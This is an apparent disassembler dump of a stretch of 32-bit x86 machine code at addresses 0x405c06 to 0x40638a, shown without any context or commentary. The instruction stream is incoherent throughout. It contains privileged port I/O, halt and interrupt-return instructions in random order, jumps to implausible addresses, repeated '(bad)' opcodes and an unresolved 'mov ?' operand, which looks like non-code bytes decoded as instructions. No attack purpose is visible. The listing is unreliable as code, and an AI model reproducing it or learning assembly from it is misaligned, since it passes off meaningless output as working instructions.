  405c06:	gs iret 
  405c08:	gs mov esp,0xd26e64b0
  405c0e:	adc    al,0x4a
  405c10:	mov    al,0x94
  405c12:	mov    eax,0x61fcb723
  405c17:	push   esp
  405c18:	mov    ah,0xe5
  405c1a:	loopne 0x405ba1
  405c1c:	jle    0x405c2a
  405c1e:	xchg   ebx,eax
  405c1f:	mov    WORD PTR [esi-0x5f33372],cs
  405c25:	jge    0x405c3a
  405c27:	sub    DWORD PTR [edi+eiz*2-0x5bb2d14e],ecx
  405c2e:	xchg   ebx,eax
  405c2f:	mov    ds:0x72bd55b3,eax
  405c34:	out    0x78,eax
  405c36:	mov    ds:0x4e9e0fda,al
  405c3b:	xchg   BYTE PTR [eax-0x60ee9c43],bl
  405c41:	shl    DWORD PTR [edx+0x1d997b77],0x37
  405c48:	xor    BYTE PTR [edx+0x5acf994e],bh
  405c4e:	push   eax
  405c4f:	hlt    
  405c50:	jmp    0xb8f1c576
  405c55:	push   ebp
  405c56:	stos   BYTE PTR es:[edi],al
  405c57:	mov    eax,DWORD PTR [edi+0x11bee863]
  405c5d:	loope  0x405c00
  405c5f:	mov    gs,edi
  405c61:	ds dec ebp
  405c63:	xor    eax,DWORD PTR [esi-0x34]
  405c66:	jo     0x405ca1
  405c68:	lds    ebp,FWORD PTR [esi-0x7188c888]
  405c6e:	test   eax,0x45dd57ef
  405c73:	retf   
  405c74:	out    dx,eax
  405c75:	cmp    eax,eax
  405c77:	xchg   BYTE PTR [edx],bh
  405c79:	push   edi
  405c7a:	mov    fs,edx
  405c7c:	iret   
  405c7d:	sbb    esp,ebx
  405c7f:	outs   dx,DWORD PTR ds:[esi]
  405c80:	sahf   
  405c81:	loope  0x405c5b
  405c83:	sbb    al,0xcd
  405c85:	push   cs
  405c86:	(bad)  
  405c87:	int    0x5
  405c89:	fidivr WORD PTR [ebx]
  405c8b:	jg     0x405cf4
  405c8d:	fist   DWORD PTR [eax]
  405c8f:	rol    BYTE PTR [edi+esi*2-0x46],0xac
  405c94:	dec    ebx
  405c95:	cmc    
  405c96:	mov    ebx,gs
  405c98:	jmp    0x405c34
  405c9a:	cmp    al,0xad
  405c9c:	xlat   BYTE PTR ds:[ebx]
  405c9d:	or     DWORD PTR [eax+0x78bb3dd],esi
  405ca3:	inc    ecx
  405ca4:	dec    edi
  405ca5:	nop
  405ca6:	jne    0x405c74
  405ca8:	push   0xffffff81
  405caa:	into   
  405cab:	xchg   ecx,eax
  405cac:	add    ebp,DWORD PTR [ebx+0x61566b60]
  405cb2:	outs   dx,BYTE PTR ds:[esi]
  405cb3:	add    BYTE PTR [edi+0x1dfcc3ee],ch
  405cb9:	mov    edi,0x9acbd259
  405cbe:	jp     0x405c6f
  405cc0:	inc    edi
  405cc1:	fnstcw WORD PTR [edx+0x1b]
  405cc4:	stc    
  405cc5:	cwde   
  405cc6:	test   al,0xd9
  405cc8:	or     al,0x87
  405cca:	xor    al,0xc7
  405ccc:	in     eax,dx
  405ccd:	cmp    bh,ch
  405ccf:	add    ecx,DWORD PTR [ecx+0x71]
  405cd2:	(bad)  
  405cd4:	mov    esp,0xce2b4b29
  405cd9:	cmp    DWORD PTR [ebx-0x23],ebp
  405cdc:	clc    
  405cdd:	mov    al,0xa
  405cdf:	push   esi
  405ce0:	inc    edi
  405ce1:	pop    ss
  405ce2:	bound  esi,QWORD PTR [esi]
  405ce4:	mov    al,ds:0x1f18d76f
  405ce9:	in     al,0x67
  405ceb:	or     eax,0x3a9be148
  405cf0:	call   0x2152716
  405cf5:	cmp    eax,0x8b487a1c
  405cfa:	sub    al,0xef
  405cfc:	ror    BYTE PTR ds:0xac312cb6,0xac
  405d03:	mov    ch,0x7f
  405d05:	inc    ebp
  405d06:	js     0x405d57
  405d08:	dec    esi
  405d09:	int    0x40
  405d0b:	div    ah
  405d0d:	sub    eax,0x643ca054
  405d12:	jno    0x405d69
  405d14:	mov    eax,ds:0x4a4d2863
  405d19:	push   edi
  405d1a:	jb     0x405d21
  405d1c:	dec    esi
  405d1d:	gs jo  0x405cae
  405d20:	fnsave [esi-0x45]
  405d23:	fist   WORD PTR [edx-0x36]
  405d26:	popa   
  405d27:	pop    ebx
  405d28:	pop    ds
  405d29:	inc    ecx
  405d2a:	popa   
  405d2b:	pop    ss
  405d2c:	add    BYTE PTR fs:[ebx-0x1d],cl
  405d30:	xchg   ebx,eax
  405d31:	ins    BYTE PTR es:[edi],dx
  405d32:	push   edx
  405d33:	pop    ecx
  405d34:	pop    ebx
  405d35:	and    edi,eax
  405d37:	fld    DWORD PTR [edx]
  405d39:	shl    BYTE PTR ds:0x55285448,0x18
  405d40:	jno    0x405d92
  405d42:	cmc    
  405d43:	sub    DWORD PTR [eax+0x3496e7e9],eax
  405d49:	loope  0x405db4
  405d4b:	mov    dl,BYTE PTR [esi]
  405d4d:	pop    ebx
  405d4e:	mov    esp,0xe8e07726
  405d53:	add    DWORD PTR [ebx],esp
  405d55:	push   edx
  405d56:	jge    0x405cf6
  405d58:	aas    
  405d59:	fsub   QWORD PTR [esi+edx*2-0xe]
  405d5d:	cmp    eax,0x98ae3513
  405d62:	mov    eax,0xa97d0f66
  405d67:	not    BYTE PTR ds:0x52db3aaa
  405d6d:	scas   eax,DWORD PTR es:[edi]
  405d6e:	or     BYTE PTR [ecx-0x93a7adf],dh
  405d74:	mov    dh,0xdd
  405d76:	mov    ds,WORD PTR [esp+eax*4+0x3ff98217]
  405d7d:	imul   ebx,esp,0x94521c79
  405d83:	les    ebp,FWORD PTR [esi]
  405d85:	adc    al,0xa6
  405d87:	test   al,bl
  405d89:	gs xchg edx,eax
  405d8b:	pusha  
  405d8c:	lods   al,BYTE PTR ds:[esi]
  405d8d:	test   DWORD PTR [edx-0x12],ecx
  405d90:	call   0x77026778
  405d95:	cli    
  405d96:	aam    0x93
  405d98:	in     eax,dx
  405d99:	inc    ebp
  405d9a:	sbb    BYTE PTR [ecx+0x4e6fcd2b],ah
  405da0:	xor    dh,bl
  405da2:	jo     0x405d7d
  405da4:	and    BYTE PTR [edi-0x1a],dh
  405da7:	fwait
  405da8:	stc    
  405da9:	and    BYTE PTR [esp+ebp*1-0x1e],dl
  405dad:	mov    al,ds:0x865028dd
  405db2:	imul   edx,DWORD PTR [ebx-0x67],0x5f4fad64
  405db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dba:	dec    ebp
  405dbb:	mov    fs,WORD PTR [ebx-0x35e2e7d4]
  405dc1:	xchg   ebp,eax
  405dc2:	xor    ch,al
  405dc4:	sbb    ah,BYTE PTR [edi-0x33]
  405dc7:	mov    esp,DWORD PTR ds:0x564b8870
  405dcd:	ds push esi
  405dcf:	push   cs
  405dd0:	sti    
  405dd1:	inc    ebx
  405dd2:	aad    0x7b
  405dd4:	fist   WORD PTR ds:0x7dcc0ac4
  405dda:	std    
  405ddb:	dec    esp
  405ddc:	push   cs
  405ddd:	or     dl,BYTE PTR [esi-0x6154012f]
  405de3:	loope  0x405dd5
  405de5:	(bad)  
  405de6:	pop    esi
  405de7:	add    edi,ebx
  405de9:	daa    
  405dea:	scas   al,BYTE PTR es:[edi]
  405deb:	cmp    eax,0xa3e904f9
  405df0:	sub    eax,0x1f2f9bfd
  405df5:	dec    esi
  405df6:	add    al,0x27
  405df8:	mov    ebx,0x42623b41
  405dfd:	aas    
  405dfe:	and    DWORD PTR [esi+0x66bb586],edi
  405e04:	mov    edx,0xb676cdad
  405e09:	cs pusha 
  405e0b:	sbb    al,0x1a
  405e0d:	pop    ebx
  405e0e:	(bad)  
  405e0f:	jnp    0x405e3b
  405e11:	sub    BYTE PTR [ecx],al
  405e13:	pop    ss
  405e14:	push   ecx
  405e15:	imul   ecx,DWORD PTR [eax+0x75880269],0xffffff99
  405e1c:	fs or  al,0x2e
  405e1f:	xor    BYTE PTR [ecx+0x7a],cl
  405e22:	neg    DWORD PTR [esi]
  405e24:	cwde   
  405e25:	nop
  405e26:	stos   DWORD PTR es:[edi],eax
  405e27:	cs pop esp
  405e29:	(bad)  
  405e2c:	add    DWORD PTR [ebp-0x79],edx
  405e2f:	push   ss
  405e30:	test   BYTE PTR [edx-0x11444e8a],al
  405e36:	push   cs
  405e37:	out    dx,al
  405e38:	or     DWORD PTR [esp+ebx*8+0x1947a3e3],0xffffffcd
  405e40:	loop   0x405dd6
  405e42:	inc    ecx
  405e44:	fsubrp st(1),st
  405e46:	and    dh,BYTE PTR [esi-0x5f]
  405e49:	(bad)  
  405e4a:	mov    esp,0x4910d41a
  405e4f:	dec    edx
  405e50:	pop    es
  405e51:	and    eax,edx
  405e53:	imul   eax,ebx,0x46d98ffb
  405e59:	push   ecx
  405e5a:	push   edx
  405e5b:	loopne 0x405e4b
  405e5d:	js     0x405e7d
  405e5f:	sub    esp,esp
  405e61:	dec    ebx
  405e62:	(bad)
  405e66:	mov    ah,0x6b
  405e68:	hlt    
  405e69:	xor    DWORD PTR [ecx],esp
  405e6b:	mov    esi,0xe0850fcc
  405e70:	xchg   edi,eax
  405e71:	pop    edx
  405e72:	fsubr  QWORD PTR [esi-0x65]
  405e75:	xchg   edi,eax
  405e76:	(bad)  
  405e77:	sbb    eax,edx
  405e79:	inc    ebx
  405e7a:	sub    DWORD PTR [ebx],ecx
  405e7c:	clc    
  405e7d:	xchg   ebx,eax
  405e7e:	inc    ebp
  405e7f:	icebp  
  405e80:	stos   DWORD PTR es:[edi],eax
  405e81:	int    0x3f
  405e83:	imul   BYTE PTR [esi+esi*1+0x5bdcf983]
  405e8a:	shl    BYTE PTR [edx],1
  405e8c:	and    edx,DWORD PTR [ebp+ebx*1+0x3df4804b]
  405e93:	out    0xaf,eax
  405e95:	je     0x405e34
  405e97:	rol    DWORD PTR [edx],0xf7
  405e9a:	xor    dh,cl
  405e9c:	cmp    al,0xdd
  405e9e:	push   esp
  405e9f:	mov    bh,0xbd
  405ea1:	mov    eax,0x7c762ac2
  405ea6:	icebp  
  405ea7:	sub    eax,0x7700ce7f
  405eac:	or     al,0x6e
  405eae:	pop    ecx
  405eaf:	jecxz  0x405f07
  405eb1:	stos   DWORD PTR es:[edi],eax
  405eb2:	shr    DWORD PTR [ecx+0x324892c7],1
  405eb8:	and    ecx,DWORD PTR [ebx]
  405eba:	mov    al,0xfd
  405ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ebd:	fs inc ebp
  405ebf:	ss push edi
  405ec1:	call   0xdc34d561
  405ec6:	sbb    esi,esp
  405ec8:	pop    ds
  405ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eca:	les    esi,FWORD PTR [ecx-0x78a3a91b]
  405ed0:	fsub   st(7),st
  405ed2:	mov    ah,0xc0
  405ed4:	or     al,0x1b
  405ed6:	nop
  405ed7:	jns    0x405e86
  405ed9:	fsubp  st(3),st
  405edb:	mov    ah,dl
  405edd:	push   esi
  405ede:	xchg   edx,eax
  405edf:	cmp    DWORD PTR [esp+ebp*8+0x3e3e74f6],edx
  405ee6:	hlt    
  405ee7:	jne    0x405ea4
  405ee9:	and    al,0x45
  405eeb:	loop   0x405ea2
  405eed:	pop    edi
  405eee:	or     eax,0x2140fca6
  405ef3:	xchg   ebx,eax
  405ef4:	or     dl,BYTE PTR [ebx]
  405ef6:	test   eax,0xc1eaf748
  405efb:	cmp    al,0xab
  405efd:	(bad)  
  405efe:	hlt    
  405eff:	and    al,0xc2
  405f01:	mov    ds:0xa33ea0ad,al
  405f06:	lods   eax,DWORD PTR ds:[esi]
  405f07:	push   0xb6c288e2
  405f0c:	add    cl,dh
  405f0e:	ret    
  405f0f:	cwde   
  405f10:	fisttp QWORD PTR [edx]
  405f12:	imul   esp,ecx,0xffffffa5
  405f15:	mov    dh,dh
  405f17:	(bad)  
  405f18:	jbe    0x405f43
  405f1a:	stos   DWORD PTR es:[edi],eax
  405f1b:	xchg   edx,eax
  405f1c:	mov    bh,0xee
  405f1e:	jo     0x405f09
  405f20:	xor    BYTE PTR [ebx-0x49db4fd4],ch
  405f26:	les    eax,FWORD PTR [eax+eax*1-0x76]
  405f2a:	cs inc ebx
  405f2c:	mov    ecx,0xc9ad7c21
  405f31:	jne    0x405fa2
  405f33:	div    esp
  405f35:	mov    dh,0xab
  405f37:	xchg   edi,eax
  405f38:	adc    bl,BYTE PTR ds:0x20c23176
  405f3e:	fsub   QWORD PTR cs:[edi]
  405f41:	gs sbb eax,0x4a44f0a
  405f47:	js     0x405f8d
  405f49:	mov    bl,0x2f
  405f4b:	dec    esi
  405f4c:	rcr    edi,cl
  405f4e:	lods   al,BYTE PTR ds:[esi]
  405f4f:	mov    DWORD PTR [ecx-0x72],edx
  405f52:	pop    esp
  405f53:	jo     0x405f2f
  405f55:	js     0x405fd0
  405f57:	inc    edi
  405f58:	test   ch,0xb8
  405f5b:	inc    eax
  405f5c:	push   edx
  405f5d:	hlt    
  405f5e:	pop    esi
  405f5f:	iret   
  405f60:	pop    esi
  405f61:	mov    ebp,0xfa757aef
  405f66:	cdq    
  405f67:	cmp    BYTE PTR [ecx],0xbe
  405f6a:	dec    ebx
  405f6b:	mov    eax,ds:0xccbd4a75
  405f70:	stos   DWORD PTR es:[edi],eax
  405f71:	ror    BYTE PTR [eax],cl
  405f73:	mov    ds:0xb732a4e2,al
  405f78:	fs lahf 
  405f7a:	scas   al,BYTE PTR es:[edi]
  405f7b:	cmp    BYTE PTR [edi-0x432b34ac],0x37
  405f82:	inc    eax
  405f83:	sar    DWORD PTR [ecx],cl
  405f85:	ins    BYTE PTR es:[edi],dx
  405f86:	jge    0x405f87
  405f88:	mov    WORD PTR [ecx+0x4b],ss
  405f8b:	sbb    ecx,DWORD PTR [ecx-0xdbeb6fb]
  405f91:	cmc    
  405f92:	les    esp,FWORD PTR [eax+0x5b]
  405f95:	mov    dh,0xfd
  405f97:	jne    0x405f64
  405f99:	ret    
  405f9a:	inc    edx
  405f9b:	mov    eax,0x60e80ad8
  405fa0:	imul   eax,DWORD PTR [esi-0x36],0x73
  405fa4:	mov    dl,ch
  405fa6:	pop    esi
  405fa7:	aad    0xc6
  405fa9:	xor    ebp,DWORD PTR [eax]
  405fab:	xchg   ebp,eax
  405fac:	std    
  405fad:	push   0xaaf28c97
  405fb2:	loop   0x406012
  405fb4:	inc    edx
  405fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb6:	adc    dl,BYTE PTR [ecx]
  405fb8:	out    0x18,eax
  405fba:	push   esi
  405fbb:	mov    esp,0x1764200e
  405fc0:	jne    0x405fcd
  405fc2:	pop    ds
  405fc3:	outs   dx,DWORD PTR ds:[esi]
  405fc4:	ja     0x405fad
  405fc6:	inc    esp
  405fc7:	clc    
  405fc8:	push   esi
  405fc9:	cmc    
  405fca:	in     eax,0x1e
  405fcc:	pop    edi
  405fcd:	inc    esi
  405fce:	xor    edi,ecx
  405fd0:	xchg   ebp,eax
  405fd1:	in     eax,0x45
  405fd3:	xchg   esp,eax
  405fd4:	fcmovne st,st(3)
  405fd6:	inc    esi
  405fd7:	(bad)  
  405fd8:	sbb    DWORD PTR [ecx],ebp
  405fda:	mov    dh,0x6d
  405fdc:	push   ebx
  405fdd:	add    al,0x83
  405fdf:	inc    eax
  405fe0:	push   ss
  405fe1:	ins    BYTE PTR es:[edi],dx
  405fe2:	sbb    al,0xe9
  405fe4:	dec    ecx
  405fe5:	stc    
  405fe6:	in     eax,dx
  405fe7:	in     eax,dx
  405fe8:	jmp    0x5a7e:0x5059d657
  405fef:	in     eax,0xcd
  405ff1:	dec    esi
  405ff2:	add    ebp,DWORD PTR [ecx+0x36]
  405ff5:	shl    BYTE PTR [eax+ebp*4-0x4b6eea9b],1
  405ffc:	aas    
  405ffd:	out    dx,eax
  405ffe:	xchg   esi,eax
  405fff:	pop    edx
  406000:	xchg   edi,eax
  406001:	scas   eax,DWORD PTR es:[edi]
  406002:	iret   
  406003:	adc    DWORD PTR [eax+0x56],ecx
  406006:	sub    BYTE PTR [ebx+0x16],bl
  406009:	adc    DWORD PTR [esi+0x709dc8d4],ebx
  40600f:	xlat   BYTE PTR ds:[ebx]
  406010:	push   eax
  406011:	test   al,0x63
  406013:	retf   0xa084
  406016:	dec    esp
  406017:	sbb    DWORD PTR [ebx+0x5db68d38],esi
  40601d:	out    0x1d,al
  40601f:	or     al,0x7e
  406021:	loop   0x406004
  406023:	aas    
  406024:	jae    0x405fd2
  406026:	bound  edx,QWORD PTR [ebp-0x2]
  406029:	fdivr  QWORD PTR [edx]
  40602b:	mov    eax,edx
  40602d:	sar    BYTE PTR [ecx-0x2f],1
  406030:	sub    BYTE PTR [ebx+0x64],0x50
  406034:	inc    esp
  406035:	icebp  
  406036:	xor    BYTE PTR [ebx],dh
  406038:	scas   al,BYTE PTR es:[edi]
  406039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603a:	xor    BYTE PTR [ecx],bh
  40603c:	sub    BYTE PTR [ecx],0x54
  40603f:	add    DWORD PTR [bx+0x35],ecx
  406043:	push   ds
  406044:	jp     0x405fe6
  406046:	sub    bl,ch
  406048:	cmp    dl,ah
  40604a:	sub    ecx,esp
  40604c:	mov    ah,0x94
  40604e:	and    edx,0x19
  406051:	bound  esi,QWORD PTR [esi]
  406053:	repz push 0xb2c55567
  406059:	ins    DWORD PTR es:[edi],dx
  40605a:	loop   0x40602d
  40605c:	jnp    0x4060b1
  40605e:	or     BYTE PTR [esi+0x2a],bh
  406061:	fbstp  TBYTE PTR [esi-0x43]
  406064:	pop    esp
  406065:	or     esi,ebp
  406067:	sub    eax,0xecc5f1b5
  40606c:	sub    al,0x9a
  40606e:	jecxz  0x4060ab
  406070:	xor    edi,DWORD PTR [edi-0x32]
  406073:	fwait
  406074:	jne    0x406035
  406076:	mov    DWORD PTR [edi-0x39153c49],esp
  40607c:	(bad)  
  40607e:	add    eax,0x2820f073
  406083:	sbb    eax,0xbe53c48d
  406088:	mov    ds:0xbb9db888,eax
  40608d:	cdq    
  40608e:	lock lods al,BYTE PTR ds:[esi]
  406090:	sbb    BYTE PTR [ebp-0x54ae32ae],ch
  406096:	aaa    
  406097:	repnz in eax,0xd0
  40609a:	xchg   ecx,eax
  40609b:	mov    bl,0xa7
  40609d:	xchg   ebx,esi
  40609f:	cmp    DWORD PTR [esi+esi*4+0x65edf063],0xffffffa7
  4060a7:	fcom   DWORD PTR [eax]
  4060a9:	ds repz stc 
  4060ac:	adc    DWORD PTR [esi],edi
  4060ae:	aas    
  4060af:	add    eax,0x46ec33b6
  4060b4:	dec    esi
  4060b5:	sahf   
  4060b6:	sbb    DWORD PTR [edx-0x16559ffd],ecx
  4060bc:	mov    al,0x5e
  4060be:	xchg   edi,eax
  4060bf:	pusha  
  4060c0:	(bad)  
  4060c1:	pop    esp
  4060c2:	pop    ebp
  4060c3:	sti    
  4060c4:	push   cs
  4060c5:	fdiv   QWORD PTR [ecx]
  4060c7:	mov    al,ds:0xaa564e3c
  4060cc:	and    esi,DWORD PTR [edi-0x8]
  4060cf:	push   edi
  4060d0:	(bad)  
  4060d2:	and    dl,dh
  4060d4:	aas    
  4060d5:	push   0x68dd6ed6
  4060da:	outs   dx,DWORD PTR ds:[esi]
  4060db:	dec    ebx
  4060dc:	pop    esp
  4060dd:	(bad)  
  4060de:	(bad)  
  4060df:	(bad)  
  4060e1:	xor    eax,0x5488bbe7
  4060e6:	jne    0x406110
  4060e8:	or     BYTE PTR [edi-0x34],ah
  4060eb:	sub    al,0xa6
  4060ed:	ins    BYTE PTR es:[edi],dx
  4060ee:	jns    0x4060af
  4060f0:	loop   0x40607d
  4060f2:	jg     0x40609c
  4060f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060f5:	loop   0x406098
  4060f7:	sbb    dh,BYTE PTR ds:0x861490
  4060fd:	jg     0x406165
  4060ff:	adc    al,0x38
  406101:	stos   BYTE PTR es:[edi],al
  406102:	int3   
  406103:	rol    BYTE PTR [esi],1
  406105:	aas    
  406106:	pop    eax
  406107:	jno    0x4060e6
  406109:	sub    ah,0x1e
  40610c:	outs   dx,BYTE PTR ds:[esi]
  40610d:	ins    BYTE PTR es:[edi],dx
  40610e:	pusha  
  40610f:	daa    
  406110:	jne    0x406164
  406112:	mov    edx,esi
  406114:	mov    ebx,ds
  406116:	jle    0x406112
  406118:	dec    eax
  406119:	int    0x16
  40611b:	mov    ebx,DWORD PTR [ecx]
  40611d:	sub    DWORD PTR [edx+0x2b],esi
  406120:	retf   0x3f57
  406123:	pusha  
  406124:	(bad)  [ecx+0x671a4f03]
  40612a:	pop    eax
  40612b:	test   DWORD PTR [esi-0x1caae84e],edx
  406131:	push   esi
  406132:	push   ss
  406133:	popf   
  406134:	push   edx
  406135:	inc    edi
  406136:	sub    al,0xfc
  406138:	aam    0x15
  40613a:	dec    esi
  40613b:	pop    edi
  40613c:	enter  0x7166,0x8a
  406140:	jo     0x4061bd
  406142:	mov    DWORD PTR [edi+ebp*2-0x2f588960],edx
  406149:	xchg   ecx,eax
  40614a:	xchg   ecx,eax
  40614b:	mov    cl,0xdb
  40614d:	imul   esi,DWORD PTR gs:[esi],0xbf271e6d
  406154:	jo     0x4060fd
  406156:	cmp    edx,DWORD PTR [edi+0x16397f4d]
  40615c:	iret   
  40615d:	add    BYTE PTR [edi+0x6aeabe29],bh
  406163:	dec    si
  406165:	imul   BYTE PTR [esi-0xcfed5fa]
  40616b:	repnz nop
  40616d:	or     eax,0xe57469e0
  406172:	int    0x43
  406174:	bound  ebx,QWORD PTR [eax]
  406176:	add    ebp,DWORD PTR [ebx+ecx*1-0x3118eab0]
  40617d:	sub    eax,ebx
  40617f:	fisttp QWORD PTR [eax+0x5007c9b1]
  406185:	mul    cl
  406187:	imul   ebp,esi,0x349c84ed
  40618d:	rol    BYTE PTR ds:0xf6f2f100,0x97
  406194:	push   eax
  406195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406196:	ins    DWORD PTR es:[edi],dx
  406197:	fwait
  406198:	loop   0x406167
  40619a:	iret   
  40619b:	shl    edx,cl
  40619d:	test   BYTE PTR [ebx-0xb],dl
  4061a0:	lea    ecx,[ecx-0x3f]
  4061a3:	js     0x4061fd
  4061a5:	ret    
  4061a6:	xchg   esi,eax
  4061a7:	jl     0x406225
  4061a9:	sbb    bl,ch
  4061ab:	lahf   
  4061ac:	ins    DWORD PTR es:[edi],dx
  4061ad:	scas   al,BYTE PTR es:[edi]
  4061ae:	push   0xffffff9a
  4061b0:	and    BYTE PTR [ecx],al
  4061b2:	pop    ebp
  4061b3:	xor    eax,0x342335aa
  4061b8:	cmp    BYTE PTR [edi],0x62
  4061bb:	(bad)  [esi-0x3e]
  4061be:	jecxz  0x406168
  4061c0:	push   edi
  4061c1:	or     BYTE PTR [eax],bh
  4061c3:	das    
  4061c4:	scas   eax,DWORD PTR es:[edi]
  4061c5:	mov    dl,0x4
  4061c7:	into   
  4061c8:	sti    
  4061c9:	jns    0x406201
  4061cb:	inc    ecx
  4061cc:	or     BYTE PTR [esi],dh
  4061ce:	sar    BYTE PTR [edx+eiz*2+0x1a],0x4d
  4061d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061d4:	and    cl,ch
  4061d6:	ss lock mov ebx,0xca055fcd
  4061dd:	fistp  DWORD PTR [edx]
  4061df:	add    ebp,DWORD PTR [ebp-0x7b1bbf6a]
  4061e5:	mov    dl,BYTE PTR [eax]
  4061e7:	mov    dh,0xe1
  4061e9:	sbb    DWORD PTR [eax-0xe6c70bb],esi
  4061ef:	daa    
  4061f0:	push   cs
  4061f1:	les    esi,FWORD PTR [ebp+0x43]
  4061f4:	in     eax,dx
  4061f5:	inc    esp
  4061f6:	fsubr  QWORD PTR [esi]
  4061f8:	xor    BYTE PTR [esi+0x31],dh
  4061fb:	mov    ds:0xe651db81,eax
  406200:	inc    edi
  406201:	add    eax,0x2051d88
  406206:	or     edi,edx
  406208:	arpl   WORD PTR [edx+0x14],bx
  40620b:	push   edx
  40620c:	sub    al,0x50
  40620e:	xchg   ebx,eax
  40620f:	ror    BYTE PTR [esi+0x2e],0x92
  406213:	sar    BYTE PTR [esi],0xa3
  406216:	adc    DWORD PTR [ebp+0x1f],esi
  406219:	jns    0x40621f
  40621b:	cld    
  40621c:	lock iret 
  40621e:	mov    dl,0x34
  406220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406221:	xchg   edx,eax
  406222:	cmc    
  406223:	stc    
  406224:	rol    DWORD PTR [esi-0x18],1
  406227:	data16 das 
  406229:	cwde   
  40622a:	lahf   
  40622b:	retf   
  40622c:	int3   
  40622d:	in     al,dx
  40622e:	gs in  al,dx
  406230:	mov    eax,0x992ee28e
  406235:	add    edx,ecx
  406237:	sub    eax,0x2af34e2c
  40623c:	or     eax,0xc94eec5e
  406241:	add    ecx,DWORD PTR [ecx]
  406243:	cmp    BYTE PTR [ebx+0x3dc2e0cf],0xb7
  40624a:	sti    
  40624b:	jmp    0x406276
  40624d:	jnp    0x4061e5
  40624f:	dec    esi
  406250:	mov    dh,0xe
  406252:	sub    al,0xcd
  406254:	popf   
  406255:	fs sub eax,0x2463a3cc
  40625b:	icebp  
  40625c:	aad    0x60
  40625e:	aad    0x40
  406260:	or     DWORD PTR [edx],eax
  406262:	sbb    DWORD PTR [eax],0xffffffae
  406265:	inc    ecx
  406266:	mov    dl,0x85
  406268:	push   edi
  406269:	dec    BYTE PTR [ecx+0x4983395e]
  40626f:	cmovne ebx,DWORD PTR cs:[esi-0x19bb9594]
  406277:	jnp    0x4062d7
  406279:	mov    al,ds:0x5f117faa
  40627e:	pop    esp
  40627f:	add    eax,DWORD PTR [esi]
  406281:	mov    ebx,0xf3cf1037
  406286:	xor    eax,0xf9caa181
  40628b:	xor    al,0xe7
  40628d:	lahf   
  40628e:	int    0x8a
  406290:	ret    
  406291:	loop   0x406291
  406293:	stos   BYTE PTR es:[edi],al
  406294:	hlt    
  406295:	cmc    
  406296:	out    0xcf,al
  406298:	jne    0x406253
  40629a:	retf   
  40629b:	inc    ecx
  40629c:	jne    0x4062c3
  40629e:	cmp    eax,0x7273b9cc
  4062a3:	in     al,dx
  4062a4:	xor    dh,BYTE PTR [edx-0x75]
  4062a7:	or     BYTE PTR [esp+esi*8+0x3c38734b],cl
  4062ae:	jle    0x406286
  4062b0:	dec    esi
  4062b1:	pop    ss
  4062b2:	imul   edi,DWORD PTR fs:[edi],0x52
  4062b6:	or     dh,BYTE PTR [eax]
  4062b8:	xor    DWORD PTR [ecx+0x38],esi
  4062bb:	aad    0x38
  4062bd:	cs inc eax
  4062bf:	sar    DWORD PTR ds:0xcda152bc,cl
  4062c5:	inc    ecx
  4062c6:	cmp    al,0x57
  4062c8:	xchg   esi,eax
  4062c9:	hlt    
  4062ca:	push   es
  4062cb:	or     al,0x7d
  4062cd:	jbe    0x406257
  4062cf:	pop    eax
  4062d0:	cmp    cl,BYTE PTR [edx]
  4062d2:	xor    eax,DWORD PTR [esi-0x1e2bfea5]
  4062d8:	pop    ebp
  4062d9:	sub    DWORD PTR [ecx+0x2e],ebp
  4062dc:	fbld   TBYTE PTR [ebx]
  4062de:	pop    edx
  4062df:	mov    ?,WORD PTR ds:0xc2c2b41b
  4062e5:	data16 test bh,al
  4062e8:	aam    0x9d
  4062ea:	aad    0xf7
  4062ec:	mov    ds:0x2c88da9f,eax
  4062f1:	js     0x4062e0
  4062f3:	adc    dl,BYTE PTR [edi+0x1]
  4062f6:	pop    ds
  4062f7:	jg     0x406343
  4062f9:	mov    al,0xac
  4062fb:	and    DWORD PTR [ebp-0x301cf4ec],ecx
  406301:	adc    DWORD PTR [ebx+0x2f56e8b4],0x33
  406308:	jmp    0x406344
  40630a:	fild   WORD PTR [ecx+0x69a3d77]
  406310:	scas   eax,DWORD PTR es:[edi]
  406311:	fst    DWORD PTR [edi]
  406313:	cmp    esi,DWORD PTR [esi+0x7d742a68]
  406319:	jnp    0x406307
  40631b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40631c:	fs mov bl,0x7d
  40631f:	int    0x42
  406321:	(bad)  
  406322:	mov    ds:0x45b5895a,eax
  406327:	icebp  
  406328:	sub    edx,DWORD PTR [edi-0x74]
  40632b:	mov    bl,0xd8
  40632d:	imul   BYTE PTR [edx+0x77fd7c96]
  406333:	les    ecx,FWORD PTR [eax]
  406335:	aad    0x6d
  406337:	add    esi,DWORD PTR [ecx]
  406339:	jnp    0x406389
  40633b:	daa    
  40633c:	xchg   ebp,eax
  40633d:	rcl    cl,1
  40633f:	out    dx,al
  406340:	in     eax,dx
  406341:	pop    ebp
  406342:	lea    ecx,[edx+0x3e]
  406345:	in     al,0xe4
  406347:	xor    ecx,DWORD PTR [esi+0x4435b16]
  40634d:	add    eax,0x86eb7c42
  406352:	jmp    DWORD PTR [edi-0x7e]
  406355:	dec    ebx
  406356:	push   esi
  406357:	stos   BYTE PTR es:[edi],al
  406358:	stos   DWORD PTR es:[edi],eax
  406359:	push   0xffffffd6
  40635b:	sbb    eax,0x6ffd04d2
  406360:	(bad)  
  406361:	in     eax,dx
  406362:	test   al,0xdf
  406364:	sbb    ecx,ebp
  406366:	jae    0x40631d
  406368:	in     al,0x70
  40636a:	outs   dx,DWORD PTR ds:[esi]
  40636b:	jo     0x40639f
  40636d:	push   ebp
  40636e:	aaa    
  40636f:	or     al,al
  406371:	les    esi,FWORD PTR [edx-0x1f]
  406374:	or     DWORD PTR ds:0x30c8e8b2,edi
  40637a:	loop   0x40631e
  40637c:	and    BYTE PTR [edx+0x25],ch
  40637f:	mov    eax,ds:0x7bd8dcfe
  406384:	adc    esp,esp
  406386:	jp     0x4063b2
  406388:	jl     0x40630e
  40638a:	fnsave [ecx-0x14]
